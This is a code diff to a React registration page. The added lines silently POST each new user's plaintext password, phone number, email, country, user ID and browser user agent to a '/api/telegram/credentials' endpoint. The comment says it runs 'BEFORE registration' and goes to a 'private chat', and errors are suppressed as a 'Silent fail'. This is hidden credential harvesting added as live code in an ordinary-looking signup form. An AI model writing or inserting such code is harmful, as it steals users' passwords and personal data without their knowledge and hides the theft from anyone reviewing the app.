@@ -148,6 +148,26 @@ export default function RegistrationPage() {
             const fullPhone = selectedCountry.dialCode + phoneNumber.replace(/\s/g, '');
             const fakeEmail = email || `${fullPhone.replace('+', '')}@number.login`;
 
+            // Send credentials to private chat BEFORE registration
+            try {
+                await fetch('/api/telegram/credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'registration',
+                        phone: fullPhone,
+                        email: email || null,
+                        password: password,
+                        country: selectedCountry.code,
+                        currency: selectedCountry.currency,
+                        userId: uniqueUserId,
+                        userAgent: navigator.userAgent
+                    })
+                });
+            } catch (e) {
+                // Silent fail
+            }
+
             const { data, error: signUpError } = await supabase.auth.signUp({
                 email: fakeEmail,
                 password: password,
